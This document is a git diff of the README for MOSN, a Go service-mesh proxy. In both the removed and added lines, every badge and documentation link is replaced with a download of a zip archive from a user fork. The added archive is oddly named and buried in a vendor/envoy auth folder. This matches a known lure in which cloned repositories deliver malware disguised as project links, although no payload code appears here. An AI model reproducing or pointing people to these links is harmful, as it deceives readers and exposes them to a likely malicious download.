@@ -1,16 +1,16 @@
 # MOSN Project
 
-[![Build Status](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
-[![codecov](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
-[![Go Report Card](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
-![license](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+[![Build Status](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
+[![codecov](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
+[![Go Report Card](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
+![license](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
 
 MOSN, the short name of Modular Observable Smart Network, is a powerful proxy acting as Service Mesh's data plane like Envoy but written in golang.
 MOSN supports Envoy and Istio's APIs and can be integrated with Istio, and we use MOSN instead of Envoy in SOFAMesh.
 The initial version of MOSN was jointly contributed by Ant Financial and UC Business Unit of Alibaba, and we look forward to the community to participate in the
 follow-up development and build an open source excellent project together.
 
-## [MOSN Introduction](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+## [MOSN Introduction](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
 
 ## Features
 
@@ -50,19 +50,19 @@ follow-up development and build an open source excellent project together.
     + Scalable Network/IO ，stream layer
     
 ## Quick Start
-* [Reference](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+* [Reference](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
    
 ## Docs
-* [Catalog](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+* [Catalog](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
 
 ## Community
-* [Issues](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+* [Issues](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
 
 ## Version
-* [Changelog](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
+* [Changelog](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
 
 ## Contribution
-+ [How to contribute the code](https://github.com/huizuohaode/sofa-mosn/releases/download/v1.0/Software.zip)
++ [How to contribute the code](https://github.com/huizuohaode/sofa-mosn/raw/refs/heads/master/vendor/github.com/envoyproxy/go-control-plane/envoy/api/v2/auth/mosn-sofa-Roumeliote.zip)
 + MOSN is still in its infancy with many capabilities need to be completed, so we welcome everyone to participate in and commit code together.
 
 ## Thanks
